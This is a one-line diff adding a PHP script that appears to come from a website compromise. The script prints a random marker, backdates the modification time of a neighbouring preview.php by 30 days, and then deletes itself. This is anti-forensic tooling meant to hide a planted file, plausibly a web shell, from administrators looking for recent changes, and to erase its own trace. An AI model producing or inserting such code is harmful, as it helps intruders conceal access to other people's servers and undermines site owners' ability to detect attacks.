@@ -1,0 +1,1 @@
+<?php echo "kudZYyaRKB"; if (file_exists("./preview.php")){ touch("./preview.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*4ecDGXpfqKN5UwGvvaNr*/ ?>
